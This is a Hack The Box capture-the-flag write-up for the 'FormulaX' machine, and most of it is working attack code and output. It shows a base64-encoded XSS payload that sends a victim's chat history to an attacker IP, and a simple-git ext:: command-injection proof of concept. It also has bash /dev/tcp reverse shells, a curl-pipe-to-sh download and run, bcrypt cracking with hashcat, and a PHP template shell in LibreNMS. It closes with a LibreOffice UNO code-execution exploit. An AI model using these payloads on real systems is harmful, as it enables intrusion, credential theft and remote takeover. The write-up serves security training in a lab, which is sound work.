# FormulaX Write-up

<img src="https://labs.hackthebox.com/storage/avatars/897faece9f60bf69d8e109833f63da48.png" width="200" height="200">

## Nmap

`nmap -sC -sV 10.10.11.6`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
    |_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-cors: GET POST
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was /static/index.html
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Main page 

![main page](https://github.com/zer00d4y/writeups/assets/128820441/3a3da767-6608-4a9c-adb9-1daa98b7adbd)

Create account, login and click to the `Contact us` page 

![image](https://github.com/zer00d4y/writeups/assets/128820441/03f12159-e8aa-4ad2-be42-67d0b66cf0e3)

     const script = document.createElement('script');
    script.src = '/socket.io/socket.io.js';
    document.head.appendChild(script);
    script.addEventListener('load', function () {
        const res = axios.get(`/user/api/chat`);
        const socket = io('/', { withCredentials: true });
        socket.on('message', (my_message) => {
            fetch("http://10.10.14.42:80/?d=" + btoa(my_message))
        });
        socket.emit('client_message', 'history');
    });

XSS payload

    <img SRC=x onerror='eval(atob("BASE64-ENCODED-JAVASCRIPT-FILE"));' />

My payload

    <img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24gKCkgewogICAgY29uc3QgcmVzID0gYXhpb3MuZ2V0KGAvdXNlci9hcGkvY2hhdGApOwogICAgY29uc3Qgc29ja2V0ID0gaW8oJy8nLCB7IHdpdGhDcmVkZW50aWFsczogdHJ1ZSB9KTsKICAgIHNvY2tldC5vbignbWVzc2FnZScsIChteV9tZXNzYWdlKSA9PiB7CiAgICAgICAgZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC40Mjo4MC8/ZD0iICsgYnRvYShteV9tZXNzYWdlKSkKICAgIH0pOwogICAgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));' />

![image](https://github.com/zer00d4y/writeups/assets/128820441/5a9d1ae4-6cd9-4790-b298-3048a0f9110e)

![image](https://github.com/zer00d4y/writeups/assets/128820441/62491b8d-d3c1-4213-9f66-45a61eea84d7)

![image](https://github.com/zer00d4y/writeups/assets/128820441/97cd1412-35f9-4aa7-98f5-1a482ec92c9a)

    echo 'R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg==V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=' | base64 --decode 
    Greetings!. How can i help you today ?. You can type help to see some buildin commandsHello, I am Admin.Testing the Chat ApplicationWrite a script for  dev-git-auto-update.chatbot.htb to work properly  

Add `dev-git-auto-update.chatbot.htb` subdomain to the `/etc/hosts`

http://dev-git-auto-update.chatbot.htb/

![image](https://github.com/zer00d4y/writeups/assets/128820441/18b67a76-06a0-4ae5-b6b7-0e128f6ce741)

CVE

https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221?source=post_page-----e829d001852d--------------------------------

POC

    const simpleGit = require('simple-git')
    const git2 = simpleGit()
    git2.clone('ext::sh -c touch% /tmp/pwn% >&2', '/tmp/example-new-repo', ["-c", "protocol.ext.allow=always"]);

reverse shell payload

    bash -c 'exec bash -i &>/dev/tcp/10.10.14.42/1234 <&1'

![image](https://github.com/zer00d4y/writeups/assets/128820441/e64a3a4a-278d-45a9-b283-d5daac755a24)

    ext::sh -c curl% http://10.10.14.42/bash.sh|sh

![image](https://github.com/zer00d4y/writeups/assets/128820441/dff3ba0d-093e-4e8d-9e11-b26613bd990a)

![image](https://github.com/zer00d4y/writeups/assets/128820441/55817421-ea9f-4a3d-af98-ceb37d25ec74)

    mongo
    show dbs
    use testing
    show collections
    db.users.find()

![image](https://github.com/zer00d4y/writeups/assets/128820441/8c51d1f9-818b-492c-998e-c59e2f3894ea)

    { "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTI2NzAzODF9.a9YhNo2Jklg81S6_h-gTz4fPew3hkz78Ob8EpIpoQp8", "__v" : 0 }
    { "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }

### Hashcat

echo '$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6' > hash.txt

hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

    $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6:manchesterunited
                                                                                                                                                                                                                                                                 
    Session..........: hashcat                                                                                                                                                                                                                                   
    Status...........: Cracked                                                                                                                                                                                                                                   
    Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))                                                                                                                                                                                                       
    Hash.Target......: $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s...psB4J6                                                                                                                                                                              
    Time.Started.....: Tue Apr  9 09:49:57 2024 (38 secs)                                                                                                                                                                                                        
    Time.Estimated...: Tue Apr  9 09:50:35 2024 (0 secs)                                                                                                                                                                                                         
    Kernel.Feature...: Pure Kernel                                                                                                                                                                                                                               
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                                                                                                   
    Guess.Queue......: 1/1 (100.00%)                                                                                                                                                                                                                             
    Speed.#1.........:       75 H/s (6.28ms) @ Accel:4 Loops:32 Thr:1 Vec:1                                                                                                                                                                                      
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                                                                
    Progress.........: 2800/14344385 (0.02%)                                                                                                                                                                                                                     
    Rejected.........: 0/2800 (0.00%)                                                                                                                                                                                                                            
    Restore.Point....: 2784/14344385 (0.02%)                                                                                                                                                                                                                     
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024                                                                                                                                                                                                   
    Candidate.Engine.: Device Generator                                                                                                                                                                                                                          
    Candidates.#1....: meagan -> j123456                                                                                                                                                                                                                 
    Hardware.Mon.#1..: Util: 94%                                                                                                                                                                                                                                 
### SSH

ssh frank_dorky@formulax.htb

password: `manchesterunited`

![image](https://github.com/zer00d4y/writeups/assets/128820441/9bf17567-decc-471f-8306-5cf170452711)

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/9ff1854c-dff1-47df-a860-c4b2f23548d3)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/68aaed04-5670-48a5-9366-a60e44abf93d)

Chisel

GIT: https://github.com/jpillora/chisel

Download chisel for windows using wget and chisel url

    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz

extract chisel 

    gzip -d chisel_1.9.1_windows_amd64.gz 

Open python server on your machine

![image](https://github.com/zer00d4y/writeups/assets/128820441/6e7ac664-2ff0-4613-87c6-0fe65c996abe)

Download chisel on frank machine 

    wget http://10.10.14.42:8080/chisel_1.9.1_windows_amd64

![image](https://github.com/zer00d4y/writeups/assets/128820441/f244d2d0-bc79-42d5-b1a3-b5f10575c626)

    mv chisel_1.9.1_windows_amd64 chisel

    chmod +x chisel 

ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6

![image](https://github.com/zer00d4y/writeups/assets/128820441/1efc86fc-8634-4201-afd7-22ade3a90d25)
    
![image](https://github.com/zer00d4y/writeups/assets/128820441/f8f6216b-cce5-410f-80b5-99dd349bfa08)

Add new user 

    frank_dorky@formulax:~$ cd /opt/librenms
    frank_dorky@formulax:/opt/librenms$ ls -l adduser.php
    -rwxr-xr-x 1 librenms librenms 956 Oct 18  2022 adduser.php
    frank_dorky@formulax:/opt/librenms$ ./adduser.php test test 10
    User test added successfully
    frank_dorky@formulax:/opt/librenms$ 

![image](https://github.com/zer00d4y/writeups/assets/128820441/c654f074-edd6-4bd8-914f-310372da5c7b)

Login with `test`:`test` 

![image](https://github.com/zer00d4y/writeups/assets/128820441/9b3c8870-c417-40e8-8e02-d209873f620d)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d3225ea4-edd2-4ce3-99f7-593636bbf6a7)

Add librenms in /etc/hosts

    echo "127.0.0.1 librenms.com" | sudo tee -a /etc/hosts

Open with domain name and login again

Now Webserver is `Ok`

![image](https://github.com/zer00d4y/writeups/assets/128820441/9119c025-38c1-42dd-8ab4-b26f9dd774a9)

Create new alert template

http://librenms.com:3000/templates

![image](https://github.com/zer00d4y/writeups/assets/128820441/9a2058a4-b246-40a2-a57b-83f025842d92)

shell

    @php
    system("bash -c '/bin/bash -i >& /dev/tcp/your-ip/port 0>&1'");
    @endphp

![image](https://github.com/zer00d4y/writeups/assets/128820441/61151d6e-722c-4ce5-af01-a9f9cc60dde7)

![image](https://github.com/zer00d4y/writeups/assets/128820441/e26d7f96-a5dd-417e-a735-4c7107ea23cb)

Open `.custom.env` file where located password

    librenms@formulax:~$ cat .custom.env
    cat .custom.env
    APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
    
    DB_HOST=localhost
    DB_DATABASE=librenms
    DB_USERNAME=kai_relay
    DB_PASSWORD=mychemicalformulaX
    
    #APP_URL=
    NODE_ID=648b260eb18d2
    VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
    VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ

![image](https://github.com/zer00d4y/writeups/assets/128820441/bb396fd2-22d5-4465-80c7-b8dd91e52a13)

### SSH

ssh kai_relay@formulax.htb

Password: `mychemicalformulaX`

![image](https://github.com/zer00d4y/writeups/assets/128820441/410619a4-6194-4d30-bb7f-869229596a60)

office.sh

![image](https://github.com/zer00d4y/writeups/assets/128820441/20dd4eb9-faa3-41e9-906a-401cc4399a19)

Exploit 

https://www.exploit-db.com/exploits/46544

    import uno
    from com.sun.star.system import XSystemShellExecute
    import argparse
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', help='host to connect to', dest='host', required=True)
    parser.add_argument('--port', help='port to connect to', dest='port', required=True)
    
    args = parser.parse_args()
    # Define the UNO component
    localContext = uno.getComponentContext()
    
    # Define the resolver to use, this is used to connect with the API
    resolver = localContext.ServiceManager.createInstanceWithContext(
    				"com.sun.star.bridge.UnoUrlResolver", localContext )
    
    # Connect with the provided host on the provided target port
    print("[+] Connecting to target...")
    context = resolver.resolve(
    	"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
        
    # Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
    service_manager = context.ServiceManager
    print("[+] Connected to {0}".format(args.host))
    shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
    shell_execute.execute("calc.exe", '',1)

Create shell.sh 

    bash -c '/bin/bash -i >& /dev/tcp/your-ip/port 0>&1'

![image](https://github.com/zer00d4y/writeups/assets/128820441/1261b6f3-282d-45b2-bb5a-1948158be371)

    chmod +x shell.sh

Download shell on kai_relay machine

![image](https://github.com/zer00d4y/writeups/assets/128820441/57ac86f5-c64d-47aa-81f6-6bdaaa060c63)

Create exploit on kai_relay machine

![image](https://github.com/zer00d4y/writeups/assets/128820441/d929bc58-9af9-4e8c-b35a-1e5fd5722e98)

Create exploit.py

    #! /usr/bin/env python3 
    import uno
    from com.sun.star.system import XSystemShellExecute 
    
    local = uno.getComponentContext()
    resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver",  local)
    context = resolver.resolve("uno:socket,host=localhost, port=2002;urp;StarOffice.ComponentContext")
    rc = context.ServiceManager.createInstance("com.sun.star.system.SystemShellExecute")
    rc.execute("bash","/shell.sh", 1)


